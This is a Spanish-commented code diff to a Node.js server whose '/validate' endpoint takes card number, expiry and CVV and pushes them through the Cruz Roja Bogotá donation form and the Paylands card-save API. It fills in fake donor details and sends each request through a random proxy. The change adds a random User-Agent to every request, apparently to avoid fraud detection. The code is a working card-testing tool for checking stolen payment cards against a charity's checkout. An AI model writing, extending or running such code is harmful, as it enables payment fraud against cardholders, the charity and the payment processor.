@@ -4,6 +4,7 @@ const https = require('https');
 const path = require('path');
 const faker = require('faker');
 const { HttpsProxyAgent } = require('https-proxy-agent');
+const UserAgent = require('user-agents'); // <--- NUEVO
 
 const app = express();
 
@@ -157,6 +158,11 @@ app.post('/validate', async (req, res) => {
   let cardBank = '';
   let amount = 0;
 
+  // --- NUEVO: Proxy y User-Agent únicos por flujo ---
+  const proxyUrl = getRandomProxy();
+  const proxyAgent = new HttpsProxyAgent(proxyUrl);
+  const userAgent = new UserAgent().toString();
+
   try {
     addLog(logs, '🔵 Iniciando validación...');
     const [number, month, year, cvv] = cardData.split('|');
@@ -167,19 +173,15 @@ app.post('/validate', async (req, res) => {
       throw new Error('Formato de tarjeta incorrecto. Use: NUMERO|MES|AÑO|CVV');
     }
 
-    // Ejemplo de request usando proxy aleatorio:
-    const proxyUrl = getRandomProxy();
-    const proxyAgent = new HttpsProxyAgent(proxyUrl);
-
     // Endpoint 1: Pixel Tracking
     addLog(logs, '🟡 Enviando a endpoint 1 (Pixel)...');
-    await sendPixelRequest(logs, proxyAgent);
+    await sendPixelRequest(logs, proxyAgent, userAgent);
 
     // OMITIDO: Endpoint 2 OPTIONS Preflight
 
     // Endpoint 3: GET Form Data (y extraer cookies)
     addLog(logs, '🟡 Enviando a endpoint 3 (GET Form)...');
-    const getFormResp = await getFormDataWithCookies(logs, proxyAgent);
+    const getFormResp = await getFormDataWithCookies(logs, proxyAgent, userAgent);
     cookies = getFormResp.cookies;
     addLog(logs, '🍪 Cookies obtenidas: ' + JSON.stringify(cookies));
 
@@ -201,7 +203,7 @@ app.post('/validate', async (req, res) => {
           fakeUser,
           amount,
           phone
-        }, logs, proxyAgent);
+        }, logs, proxyAgent, userAgent);
         leadError = null;
       } catch (err) {
         leadError = err;
@@ -233,7 +235,7 @@ app.post('/validate', async (req, res) => {
       fakeUser,
       amount,
       phone
-    }, logs, proxyAgent);
+    }, logs, proxyAgent, userAgent);
     cookies = donationTokenResp.cookies; // Actualizar cookies
     paymentToken = donationTokenResp.token;
     addLog(logs, '🔵 Respuesta endpoint 5: ' + JSON.stringify(donationTokenResp.data));
@@ -246,7 +248,7 @@ app.post('/validate', async (req, res) => {
       month,
       year,
       cvv
-    }, logs, proxyAgent);
+    }, logs, proxyAgent, userAgent);
     uuid = paylandsResp.uuid;
     cardBrand = paylandsResp.brand;
     cardBrandDesc = paylandsResp.brand_description;
@@ -261,7 +263,7 @@ app.post('/validate', async (req, res) => {
       amount,
       phone,
       uuid
-    }, logs, proxyAgent);
+    }, logs, proxyAgent, userAgent);
     addLog(logs, '🔵 Respuesta endpoint 7: ' + JSON.stringify(donationFinalResp));
 
     addLog(logs, '✅ Validación completada con éxito');
@@ -298,7 +300,7 @@ app.post('/validate', async (req, res) => {
 
 // Funciones para los endpoints
 
-async function sendPixelRequest(logs, proxyAgent) {
+async function sendPixelRequest(logs, proxyAgent, userAgent) {
   try {
     const response = await axios.post(
       'https://donar.cruzrojabogota.org.co/wp-admin/admin-ajax.php',
@@ -323,7 +325,8 @@ async function sendPixelRequest(logs, proxyAgent) {
       {
         headers: {
           'X-Requested-With': 'XMLHttpRequest',
-          'Content-Type': 'application/x-www-form-urlencoded'
+          'Content-Type': 'application/x-www-form-urlencoded',
+          'User-Agent': userAgent
         },
         httpsAgent: proxyAgent
       }
@@ -337,13 +340,14 @@ async function sendPixelRequest(logs, proxyAgent) {
 
 // OMITIDO: sendOptionsRequest
 
-async function getFormDataWithCookies(logs, proxyAgent) {
+async function getFormDataWithCookies(logs, proxyAgent, userAgent) {
   try {
     const response = await axios.get(
       'https://my.afrus.org/api/form/2d90b31c-4ac3-4bd8-9656-0de01743902f',
       {
         headers: {
-          'Accept': 'application/json'
+          'Accept': 'application/json',
+          'User-Agent': userAgent
         },
         httpsAgent: proxyAgent
       }
@@ -359,7 +363,7 @@ async function getFormDataWithCookies(logs, proxyAgent) {
   }
 }
 
-async function leadDonationStart({ cookies, fakeUser, amount, phone }, logs, proxyAgent) {
+async function leadDonationStart({ cookies, fakeUser, amount, phone }, logs, proxyAgent, userAgent) {
   try {
     const response = await axios.post(
       'https://my.afrus.org/api/leadDonationStart',
@@ -403,7 +407,7 @@ async function leadDonationStart({ cookies, fakeUser, amount, phone }, logs, pro
       },
       {
         headers: {
-          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
+          'User-Agent': userAgent,
           'Accept': 'application/json, text/plain, */*',
           'Content-Type': 'application/json;charset=UTF-8',
           'Cookie': Object.entries(cookies).map(([k, v]) => `${k}=${v}`).join('; ')
@@ -420,7 +424,7 @@ async function leadDonationStart({ cookies, fakeUser, amount, phone }, logs, pro
   }
 }
 
-async function donationToken({ cookies, fakeUser, amount, phone }, logs, proxyAgent) {
+async function donationToken({ cookies, fakeUser, amount, phone }, logs, proxyAgent, userAgent) {
   try {
     const response = await axios.post(
       'https://my.afrus.org/api/donation',
@@ -466,7 +470,7 @@ async function donationToken({ cookies, fakeUser, amount, phone }, logs, proxyAg
       },
       {
         headers: {
-          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
+          'User-Agent': userAgent,
           'Accept': 'application/json, text/plain, */*',
           'Content-Type': 'application/json;charset=UTF-8',
           'Cookie': Object.entries(cookies).map(([k, v]) => `${k}=${v}`).join('; ')
@@ -485,7 +489,7 @@ async function donationToken({ cookies, fakeUser, amount, phone }, logs, proxyAg
   }
 }
 
-async function paylandsCardSave({ token, number, month, year, cvv }, logs, proxyAgent) {
+async function paylandsCardSave({ token, number, month, year, cvv }, logs, proxyAgent, userAgent) {
   try {
     const response = await axios.post(
       'https://api.paylands.com/v1/cards/save/frame',
@@ -500,7 +504,7 @@ async function paylandsCardSave({ token, number, month, year, cvv }, logs, proxy
       {
         headers: {
           'X-Requested-With': 'XMLHttpRequest',
-          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
+          'User-Agent': userAgent,
           'Accept': '*/*',
           'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
         },
@@ -521,7 +525,7 @@ async function paylandsCardSave({ token, number, month, year, cvv }, logs, proxy
   }
 }
 
-async function donationFinal({ cookies, fakeUser, amount, phone, uuid }, logs, proxyAgent) {
+async function donationFinal({ cookies, fakeUser, amount, phone, uuid }, logs, proxyAgent, userAgent) {
   try {
     const response = await axios.post(
       'https://my.afrus.org/api/donation',
@@ -568,7 +572,7 @@ async function donationFinal({ cookies, fakeUser, amount, phone, uuid }, logs, p
       },
       {
         headers: {
-          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
+          'User-Agent': userAgent,
           'Accept': 'application/json, text/plain, */*',
           'Content-Type': 'application/json;charset=UTF-8',
           'Cookie': Object.entries(cookies).map(([k, v]) => `${k}=${v}`).join('; ')
